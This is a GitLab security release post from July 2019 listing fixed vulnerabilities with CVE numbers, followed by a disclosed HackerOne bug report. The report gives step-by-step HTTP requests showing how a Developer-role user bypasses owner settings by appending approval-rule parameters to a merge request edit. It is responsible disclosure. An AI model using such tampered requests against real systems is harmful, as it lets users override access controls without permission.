=== Content from about.gitlab.com_7567e5d5_20250121_001918.html ===


[‚Üê
Back to
releases](/releases/categories/releases/)
Jul 29, 2019

-
[Jeremy Matos](/company/team/#jeremymatos)
# GitLab Security Release: 12.1.2, 12.0.4, and 11.11.7

Learn more about GitLab Security Release: 12.1.2, 12.0.4, and 11.11.7 for GitLab Community Edition (CE) and Enterprise Edition (EE)

Today we are releasing versions 12.1.2, 12.0.4, and 11.11.7 for GitLab Community Edition (CE) and Enterprise Edition (EE).

These versions contain important security fixes, and we strongly recommend that all GitLab installations be upgraded to one of these versions immediately.

The vulnerability details will be made public on our [issue tracker](https://gitlab.com/gitlab-org/gitlab-ce/issues?scope=all&utf8=%E2%9C%93&state=opened&label_name[]=security) in approximately 30 days.

Please read on for more information regarding this release.

## GitHub Integration SSRF

An input validation problem was discovered in the GitHub service integration which could result in an attacker being able to make arbitrary POST requests in a GitLab instance's internal network. The issue is now mitigated in the latest release and is assigned [CVE-2019-5461](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-5461).

Thanks to [@jobert](https://hackerone.com/jobert) for responsibly reporting this vulnerability to us.

### Versions Affected

Affects GitLab CE/EE 10.6 and later.

### Remediation

We **strongly recommend** that all installations running an affected version above are upgraded to the latest version as soon as possible.

## Trigger Token Impersonation

An authorization issue was discovered when trigger tokens are not rotated once ownership of them has changed. The issue is now mitigated in the latest release and is assigned [CVE-2019-5462](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-5462).

Thanks to [@ashish\_r\_padelkar](https://hackerone.com/ashish_r_padelkar) for responsibly reporting this vulnerability to us.

### Versions Affected

Affects GitLab CE/EE 9.0 and later.

### Remediation

We **strongly recommend** that all installations running an affected version above are upgraded to the latest version as soon as possible.

## Build Status Disclosure

An authorization issue was discovered in the CI badge images endpoint which could result in disclosure of the build status. The issue is now mitigated in the latest release and is assigned [CVE-2019-5463](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-5463).

Thanks to [@xanbanx](https://hackerone.com/xanbanx) for responsibly reporting this vulnerability to us.

### Versions Affected

Affects all previous GitLab CE/EE versions.

### Remediation

We **strongly recommend** that all installations running an affected version above are upgraded to the latest version as soon as possible.

## SSRF Mitigation Bypass

A flawed DNS rebinding protection issue was discovered in `url_blocker.rb` which could result in SSRF where the library is utilized. The issue is now mitigated in the latest release and is assigned [CVE-2019-5464](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-5464).

Thanks to [@mclaren650sspider](https://hackerone.com/mclaren650sspider) for responsibly reporting this vulnerability to us.

### Versions Affected

Affects GitLab CE/EE 10.2 and later.

### Remediation

We **strongly recommend** that all installations running an affected version above are upgraded to the latest version as soon as possible.

## Information Disclosure New Issue ID

An authorization issue was discovered in the move issue feature which could result in disclosure of the newly created issue ID. The issue is now mitigated in the latest release and is assigned [CVE-2019-5465](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-5465).

Thanks to [@ashish\_r\_padelkar](https://hackerone.com/ashish_r_padelkar) for responsibly reporting this vulnerability to us.

### Versions Affected

Affects GitLab CE/EE 8.14 and later.

### Remediation

We **strongly recommend** that all installations running an affected version above are upgraded to the latest version as soon as possible.

## IDOR Label Name Enumeration

An IDOR was discovered in the new merge requests endpoint which could result in disclosure of label names. The issue is now mitigated in the latest release and is assigned [CVE-2019-5466](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-5466).

Thanks to [@ashish\_r\_padelkar](https://hackerone.com/ashish_r_padelkar) for responsibly reporting this vulnerability to us.

### Versions Affected

Affects GitLab CE/EE 11.5 and later.

### Remediation

We **strongly recommend** that all installations running an affected version above are upgraded to the latest version as soon as possible.

## Persistent XSS Wiki Pages

An input validation and output encoding issue was discovered in the wiki pages feature which could result in a persistent XSS. The issue is now mitigated in the latest release and is assigned [CVE-2019-5467](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-5467).

Thanks to [@ryhmnlfj](https://hackerone.com/ryhmnlfj) for responsibly reporting this vulnerability to us.

### Versions Affected

Affects GitLab CE/EE 11.10 and later.

### Remediation

We **strongly recommend** that all installations running an affected version above are upgraded to the latest version as soon as possible.

## User Revokation Bypass with Mattermost Integration

An authorization issue was discovered when Mattermost slash commands are used with a blocked account. The issue is now mitigated in the latest release and is assigned [CVE-2019-5468](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-5468).

Thanks to [@logan5](https://hackerone.com/logan5) for responsibly reporting this vulnerability to us.

### Versions Affected

Affects GitLab CE/EE 8.14 command service and later.

### Remediation

We **strongly recommend** that all installations running an affected version above are upgraded to the latest version as soon as possible.

## Arbitrary File Upload via Import Project Archive

A file upload issue was discovered when importing a project archive. The issue is now mitigated in the latest release and is assigned [CVE-2019-5469](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-5469).

Thanks to [@ajxchapman](https://hackerone.com/ajxchapman) for responsibly reporting this vulnerability to us.

### Versions Affected

Affects GitLab CE/EE 10.5 and later.

### Remediation

We **strongly recommend** that all installations running an affected version above are upgraded to the latest version as soon as possible.

## Information Disclosure Vulnerability Feedback

An authorization issue was discovered in the security dashboard which could result in disclosure of vulnerability feedback information. The issue is now mitigated in the latest release and is assigned [CVE-2019-5470](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-5470).

Thanks to [@ashish\_r\_padelkar](https://hackerone.com/ashish_r_padelkar) for responsibly reporting this vulnerability to us.

### Versions Affected

Affects GitLab CE/EE 10.8 and later.

### Remediation

We **strongly recommend** that all installations running an affected version above are upgraded to the latest version as soon as possible.

## Persistent XSS via Email

An input validation and output encoding issue was discovered in the email notification feature which could result in a persistent XSS. The issue is now mitigated in the latest release and is assigned [CVE-2019-5471](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-5471).

Thanks to [@mario-areias](https://hackerone.com/mario-areias) for responsibly reporting this vulnerability to us.

### Versions Affected

Affects GitLab EE 8.9 and later.

### Remediation

We **strongly recommend** that all installations running an affected version above are upgraded to the latest version as soon as possible.

## Denial Of Service Epic Comments

An authorization issue was discovered that forbid to delete epic comments. The issue is now mitigated in the latest release and is assigned [CVE-2019-5472](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-5472).

Thanks to [@ashish\_r\_padelkar](https://hackerone.com/ashish_r_padelkar) for responsibly reporting this vulnerability to us.

### Versions Affected

Affects all previous GitLab EE 10.7 and later.

### Remediation

We **strongly recommend** that all installations running an affected version above are upgraded to the latest version as soon as possible.

## Email Verification Bypass

An authentication issue was discovered that allowed to bypass email verification. The issue is now mitigated in the latest release and is assigned [CVE-2019-5473](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-5473).

Thanks to [@ngalog](https://hackerone.com/ngalog) for responsibly reporting this vulnerability to us.

### Versions Affected

Affects GitLab EE 12.0 and later.

### Remediation

We **strongly recommend** that all installations running an affected version above are upgraded to the latest version as soon as possible.

## Override Merge Request Approval Rules

An authorization issue was discovered in the merge request approval rules. The issue is now mitigated in the latest release and is assigned [CVE-2019-5474](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-5474).

Thanks to [@ashish\_r\_padelkar](https://hackerone.com/ashish_r_padelkar) for responsibly reporting this vulnerability to us.

### Versions Affected

Affects GitLab EE 11.8 and later.

### Remediation

We **strongly recommend** that all installations running an affected version above are upgraded to the latest version as soon as possible.

## Disclosure of Pipeline Details

Details of restricted pipelines were visible via the merge request endpoint. The issue is now mitigated in the latest release and is assigned [CVE-2019-15594](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-15594).

Thanks to [@ashish\_r\_padelkar](https://hackerone.com/ashish_r_padelkar) for responsibly reporting this vulnerability to us.

### Versions Affected

Affects GitLab EE 11.8 and later.

### Remediation

We **strongly recommend** that all installations running an affected version above are upgraded to the latest version as soon as possible.

## Updating

To update GitLab, see the [update page](/update/).

[GitLab Security Release: 12.1.2, 12.0.4, and 11.11.7

Click to tweet!](http://twitter.com/share?text=GitLab+Security+Release%3A+12.1.2%2C+12.0.4%2C+and+11.11.7&url=https://about.gitlab.com/releases/2019/07/29/security-release-gitlab-12-dot-1-dot-2-released/&hashtags= "Tweet!")

* [security](/releases/tags.html#security)
* [security releases](/releases/tags.html#security-releases)

[Share on Facebook](http://www.facebook.com/sharer.php?u=https://about.gitlab.com/releases/2019/07/29/security-release-gitlab-12-dot-1-dot-2-released/)
[Share on X](http://x.com/share?url=https://about.gitlab.com/releases/2019/07/29/security-release-gitlab-12-dot-1-dot-2-released/&text=GitLab Security Release: 12.1.2, 12.0.4, and 11.11.7)
[Share on LinkedIn](https://www.linkedin.com/shareArticle?mini=true&url=https://about.gitlab.com/releases/2019/07/29/security-release-gitlab-12-dot-1-dot-2-released/&title=GitLab Security Release: 12.1.2, 12.0.4, and 11.11.7&summary=&source=)
[Share on Hacker News](https://news.ycombinator.com/submitlink?u=https://about.gitlab.com/releases/2019/07/29/security-release-gitlab-12-dot-1-dot-2-released/&t=GitLab Security Release: 12.1.2, 12.0.4, and 11.11.7)

* [Previous Post:
  GitLab Patch Release: 12.1.1](/releases/2019/07/24/gitlab-12-1-1-released/ "GitLab Patch Release: 12.1.1")
* [Next Post:
  GitLab Patch Release: 12.1.3](/releases/2019/07/31/gitlab-12-1-3-released/ "GitLab Patch Release: 12.1.3")

Sign up for GitLab's monthly newsletter

Thanks for subscribing!

### We want to hear from you

Enjoyed reading this blog post or have questions or feedback? Share your thoughts by creating a new topic in the GitLab community forum.

[Share your feedback](https://forum.gitlab.com/new-topic?title=GitLab Security Release: 12.1.2, 12.0.4, and 11.11.7&body=&tags=blog-feedback)

## Take GitLab for a spin

See what your team could do with The DevSecOps Platform.

[Get free trial](https://gitlab.com/-/trials/new?glm_content=default-saas-trial&glm_source=about.gitlab.com)

![](/images/cta/gitlab-enterprise-team-member-photos.png)

Have a question? We're here to help.

[Talk to an expert](https://about.gitlab.com/sales/)

[Edit this page](https://gitlab.com/-/ide/project/gitlab-com/www-gitlab-com/edit/master/-/sites/uncategorized/source/releases/posts/2019-07-29-security-release-gitlab-12-dot-1-dot-2-released.html.md)
[View source](https://gitlab.com/gitlab-com/www-gitlab-com/blob/master/sites/uncategorized/source/releases/posts/2019-07-29-security-release-gitlab-12-dot-1-dot-2-released.html.md)



=== Content from gitlab.com_91870d41_20250121_001920.html ===


[Skip to content](#content-body)
GitLab
[Next](https://next.gitlab.com)

* Menu

  + [Why GitLab](https://about.gitlab.com/why-gitlab)
  + [Pricing](https://about.gitlab.com/pricing)
  + [Contact Sales](https://about.gitlab.com/sales)
  + [Explore](/explore)
* [Why GitLab](https://about.gitlab.com/why-gitlab)
* [Pricing](https://about.gitlab.com/pricing)
* [Contact Sales](https://about.gitlab.com/sales)
* [Explore](/explore)

* [Sign in](/users/sign_in?redirect_to_referer=yes)
* [Get free trial](/users/sign_up)

Project 'gitlab-org/gitlab-ee' was moved to 'gitlab-org/gitlab'. Please update any links and bookmarks that may still have the old path.

# Override approvers and approvals required per merge request despite no permissions

**[HackerOne report #544756](https://hackerone.com/reports/544756)** by `ashish_r_padelkar` on 2019-04-21, assigned to `estrike`:

### Summary

Hello,

Owner/Maintainer of the project may prevent overriding of approvers and approvals required per merge request by having the below settings in project settings

[![Screenshot_2019-04-22_at_00.28.49.png](data:image/gif;base64...)](https://user-content.gitlab-static.net/2448aea02a5686727f28db470dc885b978765e2c/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f3534343735362f3437333336322f53637265656e73686f745f323031392d30342d32325f61745f30302e32382e34392e706e67)

However, `Developer` users can still create new approval rules per merge request!

### Steps to reproduce

1. As a project owner , set a settings like below for merge request approval rule

[![Screenshot_2019-04-22_at_00.28.49.png](data:image/gif;base64...)](https://user-content.gitlab-static.net/2448aea02a5686727f28db470dc885b978765e2c/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f3534343735362f3437333336322f53637265656e73686f745f323031392d30342d32325f61745f30302e32382e34392e706e67)

2. As a `Developer` user in a project, go to any merge request and EDIT it. once it reloads, you see that you can not EDIT or Create new approval rules.
3. Without doing anything else, just click on save and capture the below request

```
POST /PrivateGroupofGuest/project2/merge_requests/2 HTTP/1.1
Host: gitlab.com
Connection: close
Content-Length: 542
Cache-Control: max-age=0
Origin: https://gitlab.com
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
Referer: https://gitlab.com/PrivateGroupofGuest/project2/merge_requests/2/edit
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Cookie: _gitlab_session=1; event_filter=all; sidebar_collapsed=false

utf8=%E2%9C%93&_method=patch&authenticity_token=1&merge_request%5Btitle%5D=ExampleMergeRequest&merge_request%5Bdescription%5D=Closes+%233&merge_request%5Bassignee_id%5D=&merge_request%5Bmilestone_id%5D=847953&merge_request%5Blabel_ids%5D%5B%5D=&merge_request%5Blabel_ids%5D%5B%5D=10328587&merge_request%5Btarget_branch%5D=master&merge_request%5Bforce_remove_source_branch%5D=0&merge_request%5Bsquash%5D=0&merge_request%5Block_version%5D=
```

4. Append below parameters in the above request

```
&merge_request[approval_rules_attributes][][name]=ThisIsCreatedDespiteSettingsByOnwer&merge_request[approval_rules_attributes][][user_ids][]=3148078&merge_request[approval_rules_attributes][][approvals_required]=1

```

Where as `3148078` is my user ID, you may try adding yours if mine doesnt work for you.

5. So the final request would be like

```
POST /PrivateGroupofGuest/project2/merge_requests/2 HTTP/1.1
Host: gitlab.com
Connection: close
Content-Length: 542
Cache-Control: max-age=0
Origin: https://gitlab.com
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
Referer: https://gitlab.com/PrivateGroupofGuest/project2/merge_requests/2/edit
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Cookie: _gitlab_session=1; event_filter=all; sidebar_collapsed=false

utf8=%E2%9C%93&_method=patch&authenticity_token=1&merge_request%5Btitle%5D=WIP%3A+Resolve+%22yyyy%22&merge_request%5Bdescription%5D=Closes+%233&merge_request%5Bassignee_id%5D=&merge_request%5Bmilestone_id%5D=847953&merge_request%5Blabel_ids%5D%5B%5D=&merge_request%5Blabel_ids%5D%5B%5D=10328587&merge_request%5Btarget_branch%5D=master&merge_request%5Bforce_remove_source_branch%5D=0&merge_request%5Bsquash%5D=0&merge_request%5Block_version%5D=&merge_request[approval_rules_attributes][][name]=ThisIsCreatedDespiteSettingsByOnwer&merge_request[approval_rules_attributes][][user_ids][]=3148078&merge_request[approval_rules_attributes][][approvals_required]=1
```

6. Send this request. Once done, click on EDIT merge request again and scroll down to approval rules.
7. Now you should see the approval rule created despite it was not allowed by owners!

   [![Screenshot_2019-04-22_at_00.31.04.png](data:image/gif;base64...)](https://user-content.gitlab-static.net/42f9b7634bb397af0cefb6691d71d0b6dcb73ca5/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f3534343735362f3437333336332f53637265656e73686f745f323031392d30342d32325f61745f30302e33312e30342e706e67)

### What is the current *bug* behavior?

Developer can override the merge request approval rules despite settings by owner!

### What is the expected *correct* behavior?

Developer should not be allowed to create approval rule when owner isnt allowing to create

### Output of checks

This bug happens on GitLab.com and probably on omnibus installations too!

Regards,

Ashish

## Impact

Developers can override approval rule settings

## Attachments

**Warning:** Attachments received through HackerOne, please exercise caution!

* [Screenshot\_2019-04-22\_at\_00.28.49.png](https://h1.sec.gitlab.net/a/544756/473362/Screenshot_2019-04-22_at_00.28.49.png)
* [Screenshot\_2019-04-22\_at\_00.31.04.png](https://h1.sec.gitlab.net/a/544756/473363/Screenshot_2019-04-22_at_00.31.04.png)

Assignee
Loading

Time tracking
Loading

Confidentiality

Confidentiality controls have moved to the issue actions menu () at the top of the page.


